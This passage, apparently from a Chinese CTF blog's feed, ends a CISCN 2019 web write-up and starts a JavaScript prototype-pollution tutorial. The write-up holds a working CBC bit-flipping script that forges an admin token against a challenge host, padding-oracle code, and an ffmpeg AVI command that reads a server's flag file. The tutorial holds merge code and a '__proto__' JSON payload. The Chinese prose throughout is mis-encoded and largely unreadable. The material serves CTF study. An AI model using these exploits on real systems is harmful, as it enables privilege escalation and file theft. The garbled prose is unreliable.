class="string">"block=%d"</span> % block)</span><br><span class="line">        total_plain += plain.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        print(total_plain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total_plain</span><br><span class="line"></span><br><span class="line">plain_text = padding_oracle(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY2lZV3YrYW9NZi9EV2hvU1laaVFpWTJkanlpV1hJbGNqM2FRTndmajdLNnpvZGwzcUhsb2lPakdxWGhCRTN6UHVTeDMwY2lPdlpMZm5ya2tDZ0ZWRXFRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoic3c4SHByRENncFJHRWZwYzMxY29KME1DR1NkRm90SlgiLCJleHBpcmVfaW4iOjE1ODI5ODYwODB9"</span>)</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure><p>ç”±äºpaddingéœ€è¦é¢‘ç¹è¯·æ±‚æœåŠ¡å™¨ï¼Œbuuçš„é¶æœºæœŸé—´ç»å¸¸å‡ºç°404ã€‚æ‰€ä»¥æˆ‘å¾—åœ¨æ¯æ¬¡å‡ºç°404æ—¶sleepåå¤šç§’â€¦â€¦å¤ªéš¾äº†ï¼Œè·‘äº†å¿«å‡ å°æ—¶æ‰å¥½ã€‚è·‘å®Œåå¾—åˆ°æ˜æ–‡ç»“æ„</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"role"</span>:<span class="number">3</span>,<span class="attr">"user_id"</span>:<span class="number">2</span>,<span class="attr">"payload"</span>:<span class="string">"sw8HprDCgpRGEfpc31coJ0MCGSdFotJX"</span>,<span class="attr">"expire_in"</span>:<span class="number">1582986080</span>&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶å¦‚æ­¤ï¼ŒæŠŠroleæ”¹ä¸º1åº”è¯¥å°±å¯ä»¥è§£å†³æƒé™é—®é¢˜ã€‚æ‰€ä»¥cbcç¿»è½¬ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_attack</span><span class="params">(key, block, origin_content, target_content)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    <span class="comment">#print(user_key_decode)</span></span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    <span class="comment">#print(signed_key)</span></span><br><span class="line">    cipher_o = base64.b64decode(signed_key)</span><br><span class="line">    <span class="comment">#print(cipher_o)</span></span><br><span class="line">    <span class="keyword">if</span> block &gt; <span class="number">0</span>:</span><br><span class="line">        iv_prefix = cipher_o[:block * <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iv_prefix = <span class="string">b''</span></span><br><span class="line">    iv = cipher_o[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line">    cipher = cipher_o[<span class="number">16</span> + block * <span class="number">16</span>:]</span><br><span class="line">    iv_array = bytearray(iv)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])</span><br><span class="line">    iv = bytes(iv_array)</span><br><span class="line">    <span class="comment">#print(iv)</span></span><br><span class="line">    user_key_json_decode[<span class="string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_info</span><span class="params">(key)</span>:</span></span><br><span class="line">    r = requests.post(<span class="string">"http://"</span> + host +<span class="string">"/frontend/api/v1/user/info"</span>, headers=&#123;<span class="string">"Key"</span>: key&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"è·å–æˆåŠŸï¼"</span>)</span><br><span class="line">    <span class="comment">#return r.json()['data']</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_role_plain</span><span class="params">(key, role)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(user_key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    user_key_json_decode[<span class="string">'role'</span>] = role</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"ç¿»è½¬ Key:"</span>)</span><br><span class="line">user_key = cbc_attack(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY0JWN1BLdlJ2UVlGdVUydlppRXRKYlV0NkJWZGRlZUp0Rll2Nnl4dmxpaVhYMTdEcVZ6WXJjVjJEeTloekpaM29Gcm9yV0hUWDh0T2N0bjFITXFSSlBnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoidjByeEZqT2NJZW0xYzNta3o5Q2VINXZYdWxuZ0pES3AiLCJleHBpcmVfaW4iOjE1ODI5OTU2NDh9"</span>, <span class="number">0</span>, <span class="string">'&#123;"role":3,"user_'</span>, <span class="string">'&#123;"role":1,"user_'</span>)</span><br><span class="line">user_key = modify_role_plain(user_key, <span class="number">1</span>)</span><br><span class="line">print(user_key)</span><br><span class="line">print(<span class="string">"æµ‹è¯•æ‹‰å–ç”¨æˆ·ä¿¡æ¯ï¼š"</span>)</span><br><span class="line">user_info = get_user_info(user_key)</span><br><span class="line">print(user_info)</span><br></pre></td></tr></table></figure><p>å¦‚æœæµ‹è¯•çš„è¿”å›æ²¡æœ‰é—®é¢˜çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‹¿payloadä¿®æ”¹ä¸ºcookieç™»å½•äº†ã€‚å®é™…ä¸Šé¡µé¢æºç ä¸­ä¼šæç¤ºï¼Œé¢„è®¾ä¸€ä¸ªå€¼ä¸ºKeyçš„cookie,æ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ·»åŠ Keyå€¼cookie,æˆåŠŸç™»é™†ã€‚<br>æœ€åå°±æ˜¯ä¸€ä¸ªmiscå‹é¢˜ç›®äº†â€¦â€¦åå°å”¯ä¸€æ¯”è¾ƒæœ‰æ„æ€ çš„æ˜¯è§†é¢‘ä¸Šä¼ åŠŸèƒ½ï¼Œè€Œéšä¾¿ä¸Šä¼ åå†ä¸‹ä¸‹æ¥æˆ‘ä»¬çš„ä¸Šä¼ è§†é¢‘ï¼Œä¼šå‘ç°è§†é¢‘çš„MD5å€¼å‘ç”Ÿæ”¹å˜ã€‚è¯´æ˜å¯èƒ½æœåŠ¡å™¨å¯¹è§†é¢‘å¤„ç†è¿‡äº†ã€‚è¿™é‡Œèµµå¸ˆå‚…è®¾è®¡çš„æ˜¯ffmpegå¯¹è§†é¢‘å¤„ç†ã€‚æ‰€ä»¥å¯æ‰¾èƒ½å¤„ç†ffmpegæ¼æ´çš„è„šæœ¬<br><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;flag test.avi</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åå†ä¸‹ä¸‹æ¥ï¼Œç¬¬ä¸€å¸§å°±æœ‰flagäº†ã€‚<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»æ­ç”µhgame-week4å­¦åŸå‹é“¾æ±¡æŸ“</title>
      <link href="2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºæ•°æ¨¡å¯¼è‡´æœ¬æ¥ä¸æ‰“ç®—åšweek4çš„é¢˜ç›®çš„ï¼Œä¸è¿‡å½“æ—¶ç…äº†ä¸€çœ¼sekiroè¿™é“é¢˜å¹¶ä¸”çœ‹å‡ºæ¥æ˜¯åŸå‹é“¾æ±¡æŸ“(ä¹Ÿæœ‰å«Node.jsæ±¡æŸ“,javasrciptåŸå‹é“¾æ±¡æŸ“çš„)ã€‚å¯æƒœå½“æ—¶æ²¡åšè¿‡ï¼Œæ²¡æ·±å…¥ä¹Ÿæ²¡åšå‡ºæ¥ã€‚ä»Šå¤©æŠ½ç©ºçœ‹äº†ä¸‹wpæ‰æ˜ç™½ã€‚å¹²è„†æŠŠå½“æ—¶æŸ¥é˜…èµ„æ–™å­¦åˆ°çš„çŸ¥è¯†æ€»ç»“ä¸‹ã€‚</p><p>æ—¶é—´çº¿ä¸Šçœ‹ï¼Œå›½å†…æœ€æ—©å‡ºç°çš„åŸå‹é“¾æ±¡æŸ“é¢˜ç›®åº”è¯¥æ˜¯å‡ºè‡ªPç‰›ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒçš„hard-the jsã€‚æ•´ä½“ä¸Šç®—æ¯”è¾ƒæ–°çš„æ´ã€‚åœ¨å„ç§æ¯”èµ›å‡ºç°é¢‘æ¬¡ä¸€èˆ¬ï¼ŒåŸå› æœ‰å¾ˆå¤šï¼Œè¿™ç‚¹ä¹‹åå†è°ˆã€‚å…¶ä¸»è¦æ˜¯å‰ç«¯å½¢å¼çš„æ”»å‡»ï¼Œè€Œä¸”æ¶‰åŠåˆ°javascriptçŸ¥è¯†æ›´å¤šäº›ï¼Œå› æ­¤è¿˜æ˜¯è¦ä»javascriptçš„è§’åº¦å­¦ä¹ ä¸‹ï¼š</p><a id="more"></a><h1 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h1><p>ç»å¸¸æœ‰è¿™æ ·ä¸€ç§è¯´æ³•ï¼šjavascriptä¸­ä¸‡ç‰©çš†å¯¹è±¡ã€‚è¿™ä¸ªè¯´æ³•ä¸¥æ ¼æ¥è®²ä¸å‡†ç¡®ï¼Œä½†æ˜¯å´ä½“ç°äº†jsè¯­æ³•åŠä½¿ç”¨ä¸Šçš„ç‰¹æ€§ã€‚javaScriptä¸­çš„å¯¹è±¡å…¶å®å°±æ˜¯ä¸€äº›é”®å€¼å¯¹çš„é›†åˆï¼Œæ¯ä¸€ä¸ªé”®å€¼å¯¹å«åšä¸€ä¸ªå±æ€§ï¼Œæ¯”å¦‚ï¼š<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å±æ€§"><br>æ­¤æ—¶å¯¹è±¡objå°±æœ‰äº†<code>name</code>ä¸<code>website</code>ä¸¤ä¸ªå±æ€§ã€‚ä½†å…¶å®å…¶è¾“å‡ºå†…å®¹å¹¶ä¸åªæœ‰è¿™ä¸¤ä¸ªï¼Œå®Œæ•´è¾“å‡ºçš„å¦‚ä¸‹ï¼š<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="__proto__"><br>å¯ä»¥çœ‹åˆ°ï¼Œè¾“å‡ºå±æ€§ä¸­å‡ºç°äº†<code>proto</code>ä»¥åŠ<code>constructor</code>è¿™æ ·çš„å­—çœ¼ï¼Œé‚£ä»–ä»¬åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿™è¦æåˆ°jsç»§æ‰¿çš„æ¦‚å¿µï¼Œç»§æ‰¿çš„æ•´ä¸ªè¿‡ç¨‹å°±ç§°ä¸ºè¯¥ç±»çš„åŸå‹é“¾ã€‚<br>ä»åˆšåˆšçš„ä¾‹å­å¯ä»¥çœ‹åˆ°ï¼Œä»objçš„<code>__proto__</code>ä¸­èƒ½æ˜ç™½å…¶çˆ¶ç±»æ˜¯Object.(Constructorè¿”å›ç”¨äºåˆ›å»ºè¿™ä¸ªå¯¹è±¡çš„å‡½æ•°)ï¼ŒåŒæ—¶è¿˜æœ‰è®¸å¤šå…¶ä»–å‡½æ•°ã€‚</p><p>å¯¹äºç±»ï¼Œæœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å¯¹åº”çš„å±æ€§ï¼Œå«åš<code>prototype</code>ã€‚ä¸”äºŒè€…ç­‰ä»·ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªpç‰›çš„ç»å…¸ä¾‹å­<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="protoä¸prototype"></p><p>ä»ç±»çš„è§’åº¦è®²ï¼Œ<code>prototype</code>æ˜¯å…¶ä¸€ä¸ªå±æ€§ï¼Œæ‰€æœ‰ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚ä½†æ˜¯ç±»æ‰€å®ä¾‹åŒ–çš„å¯¹è±¡å¹¶ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹ï¼Œæ‰€ä»¥æ‰æœ‰<code>__proto__</code><br>å‡ºç°ï¼Œä¸”ä¸€ä¸ªå¯¹è±¡çš„<strong>proto</strong>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„prototypeå±æ€§ã€‚</p><h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h1><p>è€ŒåŸå‹é“¾çš„ç‰¹æ€§å†³å®šäº†å…¶åœ¨jsç»§æ‰¿ä¸­çš„é‡è¦ä¹‹å¤„ã€‚è€Œå…¶ç‰¹æ€§è¡¨ç°åœ¨ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æŸä¸€å±æ€§æ—¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.å¯¹è±¡(obj)ä¸­å¯»æ‰¾è¿™ä¸€å±æ€§</span><br><span class="line">2.å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨obj.__proto__ä¸­å¯»æ‰¾å±æ€§</span><br><span class="line">3.å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨obj.__proto__.__proto__ä¸­å¯»æ‰¾è¿™ä¸€å±æ€§</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæœºåˆ¶è¢«ç§°ä¸ºjsçš„prototypeç»§æ‰¿é“¾ã€‚è€ŒåŸå‹é“¾æ±¡æŸ“å°±ä¸è¿™æœ‰å…³</p><p>æ¯”å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>ç»“æœä¸º<img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æ±¡æŸ“"><br>å¯ä»¥å‘ç°ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡<code>__proto__</code>ä¿®æ”¹barå€¼åï¼Œå†åº¦å®ä¾‹åŒ–ä¸€ä¸ªæ–°çš„å¯¹è±¡æ—¶ï¼Œå…¶barå€¼ä»1å˜ä¸ºäº†2ã€‚åŸå› å¦‚ä¸‹ï¼šå‰é¢ä¿®æ”¹fooçš„åŸå‹<code>foo.__proto__.bar = 2</code>ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2.<br>é‚£ä¹ˆåé¢æˆ‘ä»¬zooç›¸å½“äºæ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªObjectç±»ï¼Œè‡ªç„¶æœ‰å±æ€§bar=2.</p><p>æ‰€ä»¥åŸå‹é“¾æ±¡æŸ“å®šä¹‰å¦‚ä¸‹ï¼š</p><blockquote><p>å¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“</p></blockquote><h1 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h1><p>åŸå‹é“¾æ±¡æŸ“çš„ä½¿ç”¨åœºæ™¯æˆ‘ä¹Ÿä¸ç†Ÿï¼Œä½†æ˜¯ç›®å‰æ ¹æ®é¢˜ç›®å‡ºç°çš„æƒ…å†µï¼Œä¸»è¦ä¸è¿™ä¸¤ä¸ªå‡½æ•°æœ‰å…³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">merge()</span><br><span class="line">clone()</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨æºç å¦‚ä¸‹,å¯ä»¥çœ‹å‡ºcloneä¸mergeå¹¶æ— æœ¬è´¨åŒºåˆ«ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬è´¨ä¸Šè¿™ä¸¤ä¸ªå‡½æ•°ä¼šæœ‰é£é™©ï¼Œå°±æ˜¯å› ä¸ºå­˜åœ¨èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œã€‚<br>ä½†æ˜¯è¦æƒ³å®ç°åŸå‹é“¾æ±¡æŸ“ï¼Œå…‰åªè¦é”®åå¯æ§æ˜¯ä¸å¤Ÿçš„ã€‚ä»¥ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸ºå‚è€ƒï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•æŠŠç¬¬äºŒä¸ªé”®åè®¾ä¸º<code>__proto__</code>å¹¶èµ‹å€¼bä¸º2ã€‚çœ‹çœ‹èƒ½ä¸èƒ½æŠŠobjectçš„å±æ€§bæ”¹ä¸º2ã€‚<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æ±¡æŸ“å¤±è´¥"><br>å¯ä»¥çœ‹è§æœ€å<code>o3.b</code>è¿”å›çš„æ˜¯<code>undefined</code>,å¹¶æ²¡æœ‰æ±¡æŸ“æˆåŠŸã€‚<br>ä¸»è¦åŸå› å°±æ˜¯å› ä¸º<code>__proto__</code>æ²¡æœ‰è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åã€‚è€Œè¿™å°±éœ€è¦æˆ‘ä¸Šé¢æåˆ°çš„å¦ä¸€ä¸ªæ¡ä»¶,ä»£ç å¦‚ä¸‹æ—¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨<code>JSON.parse()</code>ï¼Œå°±èƒ½æˆåŠŸæŠŠ<code>__proto__</code>è§£ææˆé”®åäº†ã€‚<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æ±¡æŸ“æˆåŠŸ"></p><p>æœ‰äº†è¿™äº›åŸºç¡€ï¼Œå°±åŸºæœ¬èƒ½äº†è§£åŸå‹é“¾æ±¡æŸ“çš„åŸç†äº†ã€‚</p><h1 